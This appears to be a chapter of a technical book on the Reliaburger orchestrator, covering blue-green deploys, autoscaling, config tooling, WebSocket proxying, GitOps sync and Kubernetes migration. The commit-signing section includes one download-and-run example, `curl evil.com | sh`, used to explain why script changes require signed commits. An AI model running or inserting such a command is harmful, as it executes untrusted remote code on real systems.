# The Full Package

Chapter 7 gave us rolling deploys. One instance at a time, health-checked, auto-rollback on failure. Good enough for most production deploys, and considerably better than "stop everything, start everything, hope for the best."

But "good enough for most" leaves gaps. What about the deploy where you *can't* afford even a single bad request during the transition? What about the team that scales from 3 replicas to 30 during peak hours and back to 3 overnight? What about the org that wants git to be the single source of truth, not a human running `relish apply`?

This chapter fills those gaps. Six features, each addressing a real operational need. Together they turn Reliaburger from a container orchestrator into a platform.

## Blue-green deploys

Rolling deploys replace instances one at a time. During the transition, both the old and new versions serve traffic simultaneously. For most apps, that's fine. For apps that have incompatible database schemas between versions, or APIs that break when clients see mixed responses, it's a problem.

Blue-green eliminates the mixed-version window. The approach: start an entirely new fleet ("green"), verify it's healthy, then switch all traffic at once. The old fleet ("blue") keeps running during the switch, so rollback is instant.

### How it differs from rolling

Rolling deploys are sequential. Each step is: start new, health check, swap routing, drain old, stop old. One at a time. Safe, but slow, and both versions serve traffic during the transition.

Blue-green deploys are batched. All new instances start in parallel. All get health-checked. If every green instance passes, routing swaps atomically. If any green instance fails, the entire green fleet gets torn down and blue keeps serving as if nothing happened.

```rust
pub fn execute_blue_green<D: DeployDriver>(
    state: &mut DeployState,
    driver: &D,
) -> Result<DeployResult, DeployError> {
    state.transition(DeployEvent::GreenStarting)?;

    // Start ALL green instances
    for step in &mut state.steps {
        let (id, _) = driver.start_instance(...)?;
        step.new_instance = Some(id);
    }

    // Health check ALL green instances
    state.transition(DeployEvent::GreenAllStarted)?;
    for step in &state.steps {
        driver.await_healthy(step.new_instance.as_deref().unwrap(), timeout)?;
    }

    // Atomic routing swap
    state.transition(DeployEvent::GreenAllHealthy)?;
    for step in &state.steps {
        driver.add_to_routing(app, step.new_instance...)?;
    }
    for step in &state.steps {
        driver.remove_from_routing(app, step.old_instance...);
    }

    // Drain and stop all blue instances
    // ...
}
```

The state machine got three new phases: `StartingGreen`, `HealthCheckingGreen`, `RoutingSwitching`. Each phase has a failure path. If a green instance fails health, the state machine transitions to `Reverting` (with auto-rollback) or `Halted` (without). The abort logic stops all green instances that were started and returns.

The key insight: the abort function doesn't need to "restore" anything. Blue was never touched. The routing table still points to blue. Aborting green is pure cleanup.

### Choosing between strategies

Use rolling when:
- Mixed versions are acceptable during transition
- You want to minimise extra resource usage (only 1 extra instance at a time)
- The deploy is routine (most deploys)

Use blue-green when:
- You need zero mixed-version traffic
- You can afford 2x replicas during the transition window
- Database migrations make rolling back individual instances meaningless

Configure it in the app's `[deploy]` section:

```toml
[app.web.deploy]
strategy = "blue-green"
health_timeout = "60s"
drain_timeout = "30s"
```

## Autoscaling

Three replicas at 2am is wasteful. Three replicas during a product launch is suicidal. You need the system to adjust replica counts based on actual load.

### The control loop

The autoscaler runs on the Raft leader, evaluating every 30 seconds. For each app with an `[autoscale]` section, it:

1. Queries Mayo for the average metric (CPU or memory) over a 5-minute window
2. Computes the desired replica count
3. Applies it if it differs from the current count

The formula: `desired = ceil(current * (metric / target))`. If you have 3 replicas at 90% CPU and your target is 70%, the desired count is `ceil(3 * 0.90 / 0.70) = ceil(3.86) = 4`. One more replica should bring the average down to roughly 67%.

```rust
fn compute_desired(current: u32, metric: f64, config: &AutoscaleConfig) -> u32 {
    let ratio = metric / config.target;
    let raw = (current as f64 * ratio).ceil() as u32;

    // Hysteresis: only scale down when well below target
    let desired = if raw < current {
        if metric < config.target * config.scale_down_threshold {
            raw
        } else {
            current
        }
    } else {
        raw
    };

    desired.clamp(config.min, config.max)
}
```

### Hysteresis and cooldown

Without hysteresis, the autoscaler oscillates. CPU drops to 60% (below the 70% target), it scales down, load per instance jumps back to 90%, it scales up, and you're stuck in a loop.

The fix: a scale-down threshold. The default is 0.8, meaning the metric must drop below `target * 0.8 = 56%` before scaling down. At 60%? No change. At 50%? Scale down. The gap between the scale-up trigger (> 70%) and the scale-down trigger (< 56%) prevents oscillation.

Cooldown adds a time buffer: 3 minutes between consecutive scale events for the same app. Even if the metric spikes again immediately after scaling up, the autoscaler waits. This gives the new replicas time to absorb load before the system decides they're not enough.

### Playing nice with GitOps

Can you see the problem? The git repo says `replicas = 3`. The autoscaler says `replicas = 7`. Who wins?

Both. The trick is to treat them as different concerns. The git value is the *baseline*. The autoscaler's adjustment is a *runtime override*. When Lettuce syncs, it compares the git value against the *previous git value*, not the runtime count. If the git value hasn't changed, the autoscaler's override is left alone. If the git value *has* changed (from 3 to 5, say), the autoscaler's baseline resets to 5.

```rust
pub fn update_baseline(&mut self, app_id: &AppId, new_baseline: u32) {
    if let Some(state) = self.states.get_mut(app_id) {
        state.baseline_replicas = new_baseline;
        state.current_replicas = new_baseline;
        state.last_scale_event = None;
    }
}
```

The `AutoscaleTracker` stores both the baseline (from git/config) and the current count (from the autoscaler). The `get_override` method returns `Some(n)` only if the current count differs from the baseline. Lettuce checks this to avoid resetting runtime adjustments.

### Configuration

```toml
[app.web.autoscale]
metric = "cpu"
target = "70%"
min = 2
max = 20
evaluation_window = "5m"    # optional, default 5m
cooldown = "3m"             # optional, default 3m
scale_down_threshold = 0.8  # optional, default 0.8
```

All three optional fields have sensible defaults. Most users will only set metric, target, min, and max.

### Wiring it to the cluster

The evaluation logic above — `compute_desired`, the hysteresis, the cooldown — was a library nobody spawned. The July 2026 review found `run_autoscale_loop` had no caller: `AutoscaleDecision`s were computed by tests and nothing else. An autoscaler that never runs is a thermostat with no wires.

Wiring it revealed a small design mismatch worth explaining. `run_autoscale_loop` took a *synchronous* `app_provider` closure — `Fn() -> Vec<(AppId, ...)>` — to list the apps to consider. But the apps live in the Raft desired state, which you read with an `async` call, and the metrics live in the rollup store, also async. A sync closure can't `await`. Rather than contort a shared cache to feed the sync closure, the leader task drives the same *pure* functions directly: `AutoscaleConfig::from_spec`, `evaluate`, and the `AutoscaleTracker`. The tested logic is reused; only the plumbing around it is new. When a library's shape doesn't fit the wiring, reach for its tested internals rather than bending the wiring to the shape.

We later deleted `run_autoscale_loop` outright. Nothing called it, and it started the cooldown before knowing whether the Raft write had succeeded (the first bug below). `cluster::orchestrate::spawn_autoscaler` is now the only loop.

The loop lives where every leader-only loop in Reliaburger lives — spawned once, checking leadership each tick, no start/stop dance. Each cycle: read the desired apps, keep only those with an `[autoscale]` section, query the rollup store for each app's recent metric, run `evaluate`, and on a decision commit an `AutoscaleOverride` to Raft.

That last word is the whole trick. The autoscaler doesn't deploy anything or talk to nodes. It writes one number to Raft — the desired replica count — and stops. The scheduler from Chapter 2 already watches desired state; it now reads the *effective* replica count (the override if one exists, else the spec's) and re-places accordingly, and the per-node reconcilers converge. Scaling is just another edit to desired state, flowing through the exact machinery a manual `relish apply` uses. No parallel path, no special case. The integration test drives it end to end: deploy a one-replica app, feed a sustained 95% CPU metric into the rollup stores, and watch the cluster grow the app to its `max` of three — purely because a number changed in Raft.

One honesty note on the metric. The autoscaler compares the rollup value against the target as a *utilisation fraction* (0.95 vs 0.70). What Mayo actually records for an app therefore has to be scaled that way; a metric reported in raw millicores would need a target expressed to match. The code documents this at the query seam rather than silently assuming.

### Getting the lifecycle right

The first wired autoscaler had four subtle bugs the review caught, and each one is a small lesson in ordering.

**Start the cooldown after the write, not before.** The loop used to record the scale event — which starts the cooldown clock — and *then* write to Raft. If that write failed, the app never actually scaled, but the cooldown had already started, so the autoscaler sat on its hands for three minutes while nothing had happened. The fix is a one-line reorder: commit first, and only mark the cooldown on a successful write. A failed write now retries on the very next tick, because as far as the tracker is concerned, nothing has changed. Order your side effects so a failure leaves no false memory behind.

**Clear an override the moment its baseline moves.** An override is a runtime adjustment *relative to a baseline*. Redeploy the app with a different replica count, or delete it entirely, and the old override is meaningless — worse than meaningless, because a stale "scale to 7" left sitting in Raft would quietly resize a freshly redeployed app. So the state machine clears the override in the same apply that changes the baseline: on `AppDelete`, and on an `AppSpec` whose replica count differs from the stored one. An image-only redeploy (same replica baseline) leaves the override alone — you don't want a routine version bump throwing away a legitimate scale-up.

**`min > max` is an error, not a clamp.** The old code fed `min` and `max` straight into `.clamp()`, which silently swaps them if they're out of order — so `min = 10, max = 3` quietly became "always 3", hiding an obvious operator typo. Now the `[autoscale]` block is validated at config time: `min > max`, a zero `max`, an unparseable or zero window, an out-of-range threshold — every one fails the deploy loudly with a message naming the field. A validation error the operator reads beats a clamp the operator never sees.

**Use the window the operator configured.** The rollup query was hardcoded to average the last five minutes regardless of what `evaluation_window` said. Now the configured window drives the query, as it always should have. And while we were in the numeric code, we made the resource parsers use checked arithmetic: a memory string like `99999999999999999999Gi` now returns a validation error instead of silently overflowing 64 bits into some small wrong number (a whole class of bug the review labelled DEP9).

## Config tooling

Before GitOps, before Kubernetes migration, before any of the fancy stuff, you need basic config manipulation tools. Three commands, all local (no cluster contact needed).

### `relish compile`

Merges a directory of TOML files into a single resolved config. Walks subdirectories recursively. If a subdirectory contains a `_defaults.toml`, those fields are merged into every app in the directory that doesn't set them explicitly.

```
configs/
  _defaults.toml          # image = "myorg/base:v1"
  web.toml                # [app.web] replicas = 3
  backend/
    api.toml              # [app.api] image = "api:v2"
```

Running `relish compile configs/` produces a single TOML with both apps. The web app inherits `image = "myorg/base:v1"` from defaults. The api app keeps its explicit image. The directory name `backend` becomes the namespace for the api app.

Invalid files produce warnings, not errors. One broken TOML file shouldn't block the other nine from compiling. The warnings include the filename and parse error.

### `relish fmt`

Reformats a TOML config with canonical section ordering. The order is: namespace, permission, app, job, build. Within each section, keys are alphabetical (courtesy of `BTreeMap`'s ordering when we round-trip through `toml`).

`relish fmt app.toml` rewrites the file in place. `relish fmt app.toml --check` exits non-zero if the file needs formatting, without modifying it. Use `--check` in CI to enforce consistent formatting.

The formatter is idempotent. Running it twice produces the same output as running it once.

#### The bug that ate configs

The first version of the formatter had a bug that's worth dissecting, because the fix teaches a defensive pattern you'll reuse.

The emission code walked one level of nesting: `[app.web]` worked, but a nested table like `[app.web.health]` hit a fallback that serialised the whole health table with `toml::to_string`. That function serialises a *document* — `path = "/health"` on its own line — not a *value*. The output ended up as `health = path = "/health"`, which isn't TOML at all. And because `relish fmt` writes in place, it wrote that garbage straight over your config. Format once, lose your file.

Two fixes. The first is the obvious one: emit sections recursively, so `[app.web.health]` gets its own dotted header no matter how deep it nests. Scalar fields print inline via `toml::Value`'s `Display` implementation, which produces value syntax (strings quoted, arrays bracketed), never document syntax.

The second fix is the interesting one. The formatter now refuses to return output it can't verify:

```rust
fn verify_roundtrip(
    original: &BTreeMap<String, toml::Value>,
    output: &str,
) -> Result<(), RelishError> {
    let reparsed: BTreeMap<String, toml::Value> = toml::from_str(output)
        .map_err(|e| RelishError::FormatFailed(format!(
            "formatter produced invalid TOML ({e}); file left untouched"
        )))?;
    if &reparsed != original {
        return Err(RelishError::FormatFailed(
            "formatted output would change the config's meaning; file left untouched".to_string(),
        ));
    }
    Ok(())
}
```

Parse what you're about to write, and compare it with what you started from. `toml::Value` derives `PartialEq`, so `!=` here is a deep structural comparison of the whole value tree — every table, every array, every string, in one operator. In C you'd write a recursive comparison by hand; in Rust the derive gives it to you for free, and the compiler guarantees it stays in sync with the type.

Can you see what this buys us? The formatter can still have bugs. But now a bug produces an error message instead of a corrupted file. When a tool rewrites user data in place, "fail loudly" beats "trust the code" every time.

And then, having built a guard against writing the *wrong* content, we went ahead and wrote the right content the wrong way:

```rust
fs::write(path, &formatted)?;
```

`fs::write` opens with `O_TRUNC`. The file is emptied first and refilled second, so between those two moments the config is zero bytes. Crash there, run out of disk there, get killed by the OOM killer there, and what's left isn't the old config and isn't the new one — and this is a file the node reads at startup. The round-trip guard is careful about *what* we write and said nothing about *when* the file stops being valid.

The fix is the oldest trick in Unix:

```rust
let temp = directory.join(format!(".{file_name}.{}.tmp", std::process::id()));
fs::write(&temp, bytes)?;
fs::rename(&temp, path)?;
```

Write the whole thing somewhere else, then `rename` it over the target. `rename(2)` is atomic: any reader sees the old file or the new file, never a half-file. The temp goes in the *same directory* on purpose — rename is only atomic within a filesystem, and pointing at `/tmp` would silently degrade it to copy-then-delete, which is exactly the torn write we're trying to avoid. It also carries the pid, so two `relish fmt` runs in one directory don't fight over the same scratch file.

Worth noticing how the two protections differ. The round-trip guard is about *correctness*: is this output the same config? The atomic rename is about *atomicity*: is there any instant where an observer sees neither? A tool that rewrites files in place needs both, and having one makes it very easy to assume you have the other.

The third thing `fmt` did quietly was eat comments. That part is by design — the formatter round-trips through `toml`'s typed representation, which has nowhere to keep them — but "by design" is not the same as "the operator knows". It now says so, once, when the input had comments to lose. Design decisions that destroy user data should be announced by the program, not by the documentation.

`compile` had the same shape of problem one level up. It merged files with `extend` on name-keyed maps, so a second `[app.web]` in a second file silently replaced the first, and the output looked complete. It now warns on every overwrite — while leaving two apps of the same name in *different* namespaces alone, since that's been legal since instance identity gained namespaces. And a malformed `_defaults.toml` used to be swallowed by `.ok()?`, making a typo indistinguishable from "there are no defaults": the default image vanished from every app in the directory and the error resurfaced much later as a missing field. `Option` is a lovely type for "there isn't one" and a terrible one for "there is one but I couldn't read it".

### `relish diff`

Shows a structural, field-by-field diff between two configs. Not a text diff -- a semantic one. It knows that changing `image` from `v1` to `v2` is a modification, adding a new `[app.api]` section is an addition, and removing `[job.migrate]` is a deletion.

```
$ relish diff old.toml new.toml
~ app.web
    image: myapp:v1 -> myapp:v2
+ app.api
- job.cleanup
```

The output serialises to JSON for programmatic consumption. Lettuce's diff engine reuses the same structural comparison logic.

### Exit codes are an API

A CLI has two output channels: what it prints, and what it returns. Scripts read the second one. For a long time `relish apply` got this wrong: when the agent was unreachable, it printed a dry-run plan, added a polite note, and exited 0. Run that from CI with the agent down and your pipeline goes green while deploying nothing.

The fix splits the two intents apart. `relish apply --dry-run` previews the plan and exits 0 — that's the explicit "don't deploy" path. Plain `relish apply` with no reachable agent still prints the plan for reference, but exits non-zero with an error saying nothing was deployed. If a script wanted the old behaviour, it now has to ask for it by name.

The same pass fixed a quieter lie in `relish logs`. The `--grep`, `--since`, and `--json-field` flags parsed fine and were then bound to variables named `_grep`, `_since`, `_json_field` — the underscore prefix being Rust's way of saying "I know this is unused, don't warn me". The flags did nothing, silently. Now `--grep` and `--since` travel to the server as query parameters (the endpoints already supported them), and `--json-field key=value` filters client-side, keeping only lines that parse as JSON with a matching field. In follow mode the SSE stream can't filter server-side, so the same filters apply client-side as each line arrives.

The lesson generalises. An unused-variable warning is the compiler telling you your feature doesn't work; naming the variable `_grep` to quiet it is shooting the messenger. If a flag exists, it either works or the command should reject it.

## WebSocket proxying

The Wrapper ingress proxy from Chapter 3 handles HTTP. But what happens when a client sends a WebSocket upgrade request?

The normal proxy path buffers the entire request body via `axum::body::to_bytes`. That's fine for regular HTTP. For WebSocket, it's fatal. WebSocket upgrade is an HTTP/1.1 mechanism: the client sends an upgrade request, the backend responds with `101 Switching Protocols`, and then both sides switch to raw TCP framing. You can't buffer that.

### Detection before buffering

The fix: check for WebSocket upgrade *before* touching the body.

```rust
async fn do_proxy(state: &ProxyState, req: Request<Body>) -> Response {
    let is_ws = is_websocket_upgrade(&req);

    // ... route lookup ...

    if is_ws && !route.websocket {
        return StatusCode::BAD_REQUEST.into_response();
    }

    if is_ws {
        return handle_websocket_upgrade(req, backend).await;
    }

    // Normal HTTP path (body buffering happens here)
    let body_bytes = axum::body::to_bytes(body, 10 * 1024 * 1024).await?;
    // ...
}
```

Two branches, decided before any I/O happens. WebSocket requests skip the body buffer entirely. Routes that don't have `websocket = true` reject upgrade attempts with 400. This prevents accidental WebSocket connections to backends that don't expect them.

### The upgrade detection

A valid WebSocket upgrade has two headers: `Connection: Upgrade` (or a Connection header containing "upgrade" as a token) and `Upgrade: websocket`. Both checks are case-insensitive. The Connection header can contain multiple values (`keep-alive, Upgrade`), so we check for the substring rather than exact match.

```rust
pub fn is_websocket_upgrade(req: &Request<Body>) -> bool {
    let has_upgrade_connection = req.headers()
        .get(header::CONNECTION)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.to_lowercase().contains("upgrade"));

    let has_websocket_upgrade = req.headers()
        .get(header::UPGRADE)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.eq_ignore_ascii_case("websocket"));

    has_upgrade_connection && has_websocket_upgrade
}
```

### Connection draining

WebSocket connections are long-lived. When a backend is being drained (during a rolling or blue-green deploy), HTTP connections finish naturally within the drain timeout. WebSocket connections don't finish on their own -- they stay open indefinitely.

The intended solution: send a WebSocket Close frame (opcode 0x08, status code 1001 "Going Away") to the client, wait for the close handshake, then close the TCP connection. The Close frame is just 4 bytes, hand-built with no WebSocket library:

```rust
pub fn build_close_frame(status: u16) -> Vec<u8> {
    vec![
        0x88,                        // FIN + opcode Close
        0x02,                        // payload length = 2
        (status >> 8) as u8,         // status high byte
        (status & 0xFF) as u8,       // status low byte
    ]
}
```

Here's the honest state of it: `build_close_frame` exists and is unit-tested, but it is **not yet sent on the live drain path**. Today a draining backend's WebSockets are held open as tracked in-flight connections, and at the drain deadline they're torn down via a cancellation token rather than a graceful 1001 handshake. Wiring the frame into the splice -- write it into the client half, wait a grace period, then close -- is a tracked follow-up. (The HTTP side of drain-termination *is* wired: past the deadline a new request to a terminating backend gets a 503 and an in-flight response stops mid-stream.)

## Lettuce: the GitOps engine

Every other subsystem in Reliaburger reacts to `relish apply`. Lettuce makes `relish apply` happen automatically when you push to git.

The idea: a module inside Bun watches a git repository. When a commit changes a TOML file, Lettuce parses it, diffs it against the current cluster state, and applies only the changes. No ArgoCD, no Flux, no CRDs, no extra binaries. Git is the source of truth.

### Architecture

Lettuce runs on a single council member elected as the **GitOps coordinator**. Not the Raft leader -- a separate election that distributes load. If the coordinator dies, another council member takes over within seconds, inheriting the last sync state from Raft.

The sync loop:

1. **Trigger.** Poll timer (default 30s) or webhook
2. **Git fetch.** If HEAD hasn't changed since last sync, short-circuit
3. **Signature verification.** If required (global or auto-enforced for script changes)
4. **TOML parse.** All `.toml` files under the configured path. Parse errors are per-file, not global
5. **Diff.** Field-by-field comparison against current Raft state. Autoscaler-aware
6. **Selective apply.** Only changed resources written to Raft

### Coordinator election

```rust
pub fn select_coordinator(
    council_members: &[String],
    leader_id: &str,
    reason: CoordinatorElectionReason,
) -> Option<CoordinatorElection> {
    let non_leaders: Vec<_> = council_members.iter()
        .filter(|id| id.as_str() != leader_id)
        .collect();

    let selected = if non_leaders.is_empty() {
        leader_id.to_string()  // single-node: leader is coordinator
    } else {
        let mut sorted = non_leaders;
        sorted.sort();
        sorted[0].clone()  // deterministic: first non-leader
    };

    Some(CoordinatorElection { node_id: selected, reason, ... })
}
```

Why prefer non-leaders? The Raft leader already handles write requests, log replication, and heartbeats. Adding the sync loop on top means the leader does more I/O during every sync cycle (git fetch, file read, Raft write). Putting it on another council member spreads the work across two nodes instead of concentrating it on one.

Why deterministic? If two nodes simultaneously decide the coordinator needs replacing, they must agree on who the replacement is. Sorting alphabetically and picking the first non-leader means every node arrives at the same answer independently.

### Webhook validation

When a git provider sends a push webhook, Lettuce validates it with three checks:

1. **HMAC-SHA256 signature.** GitHub sends `X-Hub-Signature-256: sha256=<hex>`. We compute the HMAC with the configured secret and compare. A mismatch means the payload was tampered with or the secret is wrong.

2. **Replay detection.** GitHub includes a unique delivery ID in `X-GitHub-Delivery`. Lettuce keeps the last 1000 delivery IDs in a bounded deque. If the same ID shows up twice, it's a replay (network retry, misconfigured webhook, or attack).

3. **Rate limiting.** Token bucket, configurable per minute (default 10). A burst of webhook deliveries from a force-push-heavy workflow doesn't overwhelm the sync loop. Excess webhooks are rejected with an error; the poll timer catches up on the next cycle.

### Script-aware signing

Here's a subtle security requirement. An unsigned commit that changes `image = "redis:7"` to `image = "redis:8"` is probably fine. An unsigned commit that adds `script = "curl evil.com | sh"` is definitely not.

Lettuce auto-enforces commit signing for any commit that adds or modifies a `script` field, regardless of the global `require_signed_commits` setting. The check happens by diffing the commit against its parent and searching for added lines containing "script".

### Back-off on failure

If a sync fails (network error, git auth failure, parse error), Lettuce doesn't retry at the normal interval. It backs off exponentially: 30s, 60s, 120s, 240s, capped at 8x the base interval. Consecutive failure count resets to zero on the first successful sync.

```rust
pub fn backoff_delay(base: Duration, failures: u32) -> Duration {
    let multiplier = 2u32.saturating_pow(failures).min(8);
    base * multiplier
}
```

### Where a token ends up when you're not looking

A private repo means a credential, and the natural place to put one is the URL: `https://x-access-token:ghp_abc@github.com/org/repo`. Configure that as `[gitops] repo`, hand it to `git clone`, and everything works.

It also leaks twice.

The first is argv. `git clone https://x-access-token:ghp_abc@…` puts the token in the process's command line, and `/proc/<pid>/cmdline` is readable by *every* local user, not just the owner. Any process on the node can read your deploy key while the clone runs. This is a well-known Unix hazard and it's easy to walk into, because a command line doesn't feel like a public place.

The second is worse, because it's durable. git records the remote it cloned from in `.git/config` — including the credentials. The clone outlives the process, so the token sits on disk indefinitely, in a file with ordinary permissions, and nothing in the code that put it there mentions it.

The fix is to split the URL:

```rust
pub(crate) fn split_credentials(url: &str) -> (String, Option<String>) {
    let Some((scheme, rest)) = url.split_once("://") else {
        return (url.to_string(), None);
    };
    // Split on the LAST `@`: a password may legitimately contain one.
    let Some((userinfo, host)) = rest.rsplit_once('@') else {
        return (url.to_string(), None);
    };
    match userinfo.split_once(':') {
        Some((user, password)) if !password.is_empty() => (
            format!("{scheme}://{user}@{host}"),
            Some(password.to_string()),
        ),
        _ => (url.to_string(), None),
    }
}
```

`rsplit_once('@')` rather than `split_once` is not fussiness — a password containing `@` is legal, and splitting on the first one would truncate the secret and produce a nonsense hostname. Note also what *doesn't* move: the username. git needs it, it isn't the secret, and leaving it in the URL keeps the change small.

The password goes into the child's environment instead, fetched by a credential helper:

```rust
command.args(["-c", &format!(
    "credential.helper=!f() {{ test \"$1\" = get && \
     printf 'password=%s\\n' \"${GIT_PASSWORD_ENV}\"; }}; f"
)]);
command.env(GIT_PASSWORD_ENV, password);
```

The helper string does reach argv — but it contains only the *name* of a variable, not its contents. `/proc/<pid>/environ`, unlike `cmdline`, is readable by the owning uid alone. The leading `!` tells git to run the helper through a shell, which is what lets it read the environment at all.

Why not `GIT_ASKPASS`? Because askpass wants a *program*, so you'd write a script to a temp file with careful permissions and clean it up on every exit path. That's a file to leak instead of a command line to leak. The credential helper needs no file.

And then there's the bug that writing this introduced, which is the part worth remembering. `reused_clone_matches` decides whether an existing clone can be reused by comparing its stored remote against the configured URL. Store a sanitised remote and that comparison fails *every time* — so every startup would delete and re-clone the repository. The security fix would have quietly turned into a performance bug that only shows on a large repo. Both sides are now sanitised before comparison, which as a bonus makes a clone from before the change reusable rather than forcing one re-clone on upgrade.

Changing what you persist changes what your equality checks mean. If some code compares a stored value against a configured one, and you alter the stored form, go and find that comparison.

### Switching it on

All of the above — `execute_sync`, the diff engine, signature verification, the webhook validator — was a library nobody ran. The July 2026 review found `execute_sync` had no caller, `/v1/gitops/webhook` returned 503 unconditionally (`gitops_webhook_tx` was hardcoded `None`), and the `[gitops]` config section was parsed and never read. A GitOps engine that never touches git.

The runner (`spawn_gitops_sync`) is the missing piece: a leader-only task that clones the configured repo, then on each poll tick or webhook nudge reads the current apps and last-applied sha from Raft, runs `execute_sync` in `spawn_blocking` (git shells out; never on the async runtime), and applies the resulting changes — `Add`/`Update` become `AppSpec` writes to Raft, `Remove` becomes `AppDelete`. Exactly the desired-state writes a manual `relish apply` makes, which means the scheduler and reconcilers from Chapter 2 pick them up for free. Git becomes just another writer of desired state. The webhook endpoint now has a channel to nudge, so a `git push` hook triggers a sync in milliseconds instead of waiting for the poll.

Wiring it flushed out a bug that only a real repo could surface. `execute_sync` starts by fetching, and treats "fetch found no new commit" as "nothing to do". But the *first* sync after cloning has nothing new to fetch — the clone already contains the commit — yet the desired state has never been applied. The result: a freshly-configured GitOps repo synced *nothing* until someone pushed a second commit. The fix distinguishes "no new commit since last fetch" from "current HEAD not yet applied": when the repo's HEAD differs from the last-*applied* sha, sync it regardless of whether the fetch pulled anything. The unit tests never caught this because they drove `execute_sync` with a mock repo whose `fetch` returned a commit on demand; only a real bare clone, where the first fetch is genuinely a no-op, exposed it.

### The trusted key that trusted everyone (H12)

One security fix rides along. Lettuce can require commits to be GPG-signed by a trusted key, and `is_key_trusted` checked the signing fingerprint against the configured allowlist. Or it looked like it did. After the loop that searched for a matching key, the function ended with `return true` — a comment explained it as "trust any valid signature when trusted_keys is provided." So a validly-signed commit from *any* key sailed through: a departed employee's key, a compromised laptop, an attacker who forked your repo and signed with their own key. The allowlist was decoration; the only check that ran was "is the signature cryptographically valid," which proves the committer holds *some* private key, not *your* private key.

The fix is one line — return whether any trusted fingerprint appears in the verify output, with no fall-through. A valid signature from an unlisted key is now `UntrustedKey`, and the commit is rejected. The two regression tests are the ones that should have existed from the start: a matching fingerprint is trusted, an unlisted one is not. It's a reminder that a security check which always returns "yes" is worse than no check, because it shows up green in the audit.

## Kubernetes migration

Most teams don't start from scratch. They have existing Kubernetes manifests -- dozens of them, spread across namespaces, wired together with Services, Ingresses, HPAs, ConfigMaps. Asking those teams to rewrite everything in TOML by hand is a non-starter.

`relish import` and `relish export` solve this. Import reads K8s YAML and produces Reliaburger TOML. Export goes the other way. Together they make migration a mechanical process, not a rewrite.

### The correlation problem

In Kubernetes, a single application is split across multiple resource types. A web app might be: a Deployment (the containers), a Service (the network endpoint), an Ingress (the external routing), an HPA (the autoscaler), a ConfigMap (the configuration), and a Secret (the credentials). Six YAML files, each referencing the others by name.

In Reliaburger, that same application is one `[app.web]` section with sub-sections for ingress, autoscale, env, and health. The importer needs to figure out which K8s resources belong together and merge them.

The correlation rules use the same matching logic Kubernetes itself uses:

1. Service → Deployment by label selector
2. Ingress → Service by backend service name
3. HPA → workload by `scaleTargetRef.name`

```rust
fn find_ingress_for_service(
    ingresses: &BTreeMap<String, Ingress>,
    service_name: &str,
) -> Option<String> {
    for (ing_name, ing) in ingresses {
        if let Some(spec) = &ing.spec {
            if let Some(rules) = &spec.rules {
                for rule in rules {
                    if let Some(http) = &rule.http {
                        for path in &http.paths {
                            if let Some(backend) = &path.backend.service {
                                if backend.name == service_name {
                                    return Some(ing_name.clone());
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    None
}
```

Five levels of `if let Some`. That's what happens when you navigate the K8s API's deeply nested Option types. Each level is a field that might not be set. The k8s-openapi crate mirrors the Go API faithfully, including the optionality of everything.

### Using k8s-openapi

We debated hand-rolling lightweight K8s structs vs pulling in the official types. The official types won for one reason: correctness. The K8s API has hundreds of fields with subtle serialisation rules (camelCase JSON keys, integer-or-string unions, multiple API versions). Getting all of that right by hand is a maintenance burden. Getting it right once via `k8s-openapi` is free.

The dependency is optional. A `kubernetes` Cargo feature (default-on) gates the import/export modules. Users who don't need K8s migration compile with `--no-default-features` and skip the dependency entirely.

```toml
[features]
default = ["kubernetes"]
kubernetes = ["dep:k8s-openapi"]

[dependencies]
k8s-openapi = { version = "0.22", default-features = false, features = ["latest"], optional = true }
```

We disable `default-features` on k8s-openapi because we only need the type definitions, not the API client operations. That shaves off a chunk of compile time.

### The field mapping

A Kubernetes Deployment becomes an `AppSpec`. The mapping isn't one-to-one, but it's close enough that the output is usable without manual editing for most cases:

- `spec.replicas` → `replicas`
- `spec.template.spec.containers[0].image` → `image`
- `containers[0].command` → `command`, `containers[0].args` → `args` (kept apart, so the runtime can apply them to the image's `Entrypoint` and `Cmd` exactly as Kubernetes does)
- `containers[0].workingDir` → `working_dir`; `securityContext.runAsUser`/`runAsGroup` → `run_as_user`/`run_as_group`
- `metadata.namespace` → `namespace`
- the Service's `targetPort` (named or numeric), else `containers[0].ports[0].containerPort` → `port`
- `env[].value` → `env` (plain values)
- `readinessProbe.httpGet` → `health` (path, and the port when it isn't the app's)
- `strategy.rollingUpdate.maxSurge` → `deploy.max_surge`
- `terminationGracePeriodSeconds` → `deploy.drain_timeout`
- `nodeSelector` → `placement.required`
- `initContainers` → `init`

DaemonSets become `replicas = "*"`. StatefulSets produce a warning because Reliaburger doesn't have ordered startup or stable network IDs. Jobs and CronJobs map directly. The whole mapping above runs through one shared `pod_spec_to_app` helper, whatever the workload kind — that wasn't always true, and the section below explains what it cost while it wasn't.

Three of those rows have a history: `command`, `namespace`, and env values used to be silently dropped. A Deployment running `python -m worker.main` would import as an app running the image's default entrypoint. No error, no warning — the config just did something different from the original. Silent data loss during migration is the worst kind, because you only discover it when the workload misbehaves in production.

`args` has a history of its own. For a long time the importer glued `command` and `args` into one vector, which was harmless while runc ignored the image's config anyway. Once runc started honouring `Entrypoint` and `Cmd` (Chapter 1), gluing became a bug: a manifest with only `args` would have replaced the image's entrypoint with its arguments. So they're separate fields now, on both sides.

Ports are the other place where a quiet mapping would lie. A Kubernetes Service can listen on port 80 and forward to container port 9898, and it can expose several ports. A Reliaburger app has one port, and `frontend:9898` reaches it on the same number. The importer follows the Service's `targetPort` (resolving names like `http` against the container's ports) to pick the app's port, and then says what it couldn't keep: the Service port that clients used to dial, any further Service ports, container ports nothing routes to, a readiness probe that runs a command or opens a TCP socket, and a Service with no workload of the same name.

Env vars that use `valueFrom` (secret refs, configmap refs, field refs) still can't map automatically — there's no way to reach into another cluster's secret store. But now they land in the migration report as warnings naming each variable, instead of vanishing. The rule the importer follows: convert what you can, warn about what you can't, drop nothing silently.

One more K8s-ism: names are scoped per namespace, so `api` in `alpha` and `api` in `beta` are different workloads. A flat TOML table has one key per name. When the importer sees a collision it keeps the first app under its own name and imports the second as `[app.beta-api]`, with a warning — rather than letting the second overwrite the first.

### The migration report

Every import produces a report on stderr: what was converted, what was approximated, and what was dropped.

```
Converted:
  + Deployment/web → [app.web]

Approximated (review recommended):
  ~ StatefulSet/redis — ordering guarantees and stable network IDs lost

Dropped (no Reliaburger equivalent):
  - MyCustomResource/foo — no Reliaburger equivalent
  - ServiceAccount/worker-sa — no Reliaburger equivalent
```

